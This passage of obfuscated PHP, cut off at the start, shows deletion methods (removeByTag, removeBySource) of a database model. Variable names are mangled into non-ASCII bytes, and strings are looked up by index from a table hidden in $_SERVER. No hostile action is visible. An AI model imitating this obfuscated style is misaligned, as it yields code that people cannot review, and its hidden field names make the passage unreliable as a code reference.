ùÄ); return $this->where($Î©¨Îã™)->delete(); } protected function removeByTag($à˜ò§ì) { $¿ä€ªš€ =& $_SERVER[Ã¶¡¶„æ]; if (!$à˜ò§ì) { return !1; } $šĞœº¯œ = array($¿ä€ªš€[1667] => USER_ID, $¿ä€ªš€[484] => $à˜ò§ì); return $this->where($šĞœº¯œ)->delete(); } protected function removeBySource($çÑÇ´ÓŸ) { $ÃßŠ¬Ë =& $_SERVER[Ã¶¡¶„æ]; if (is_array($çÑÇ´ÓŸ)) { $çÑÇ´ÓŸ = array($ÃßŠ¬Ë[7], $çÑÇ´ÓŸ); } $®ñƒ™Ãû = array($ÃßŠ¬Ë[1667] => USER_ID, $ÃßŠ¬Ë[484] => array($ÃßŠ¬Ë[1028], 0), $ÃßŠ¬Ë[421] => $çÑÇ´ÓŸ); return $this->where($®ñƒ™Ãû)->delete(); } }